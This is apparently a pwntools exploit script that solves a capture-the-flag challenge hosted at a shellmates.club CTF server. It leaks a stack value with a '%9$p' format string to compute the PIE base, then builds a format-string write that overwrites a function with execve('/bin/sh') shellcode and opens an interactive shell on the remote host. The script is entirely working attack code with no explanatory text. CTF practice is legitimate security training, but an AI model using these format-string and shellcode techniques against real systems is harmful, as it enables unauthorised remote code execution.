
from pwn import *

elf = context.binary = ELF('../challenge/chall')

#target = elf.process()

target = remote("write-what-where.ctf.shellmates.club",443,ssl=True)
#target = gdb.debug(elf.path)
target.recv()
target.sendline(b'1')
#target.sendafter("Choice: ",b'1\n')

target.recv()
target.sendline(b'%9$p')
#target.sendafter("Name: ",b'%9$p\n')

target.recv()
target.sendline(b'2')
#target.sendafter("Choice: ",b'2\n')

leaked_adr = target.recvline()

leaked_adr = leaked_adr.rstrip(b"\n")
print(leaked_adr)

elf_leak = int(leaked_adr, 16)

elf.address = elf_leak - 0x140e

log.success(f'PIE base: {hex(elf.address)}')

shellcode =  asm(shellcraft.execve("/bin/sh\0"))

#shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"; 



payload = fmtstr_payload(14 , { elf.symbols['func'] : shellcode },write_size="short")

ret = ROP(elf).find_gadget(['ret']).address

log.success(f'Type of payload : {type(payload)}')

target.recv()
target.sendline(b'1')
#target.sendafter("Choice: ",b'1\n')

target.recv()
target.send(payload)
#target.sendlineafter("Name: ",payload)

target.recv()
target.sendline(b'2')
#target.sendafter("Choice: ",b'2\n')
target.recv()
target.sendline(b'3')

target.interactive()

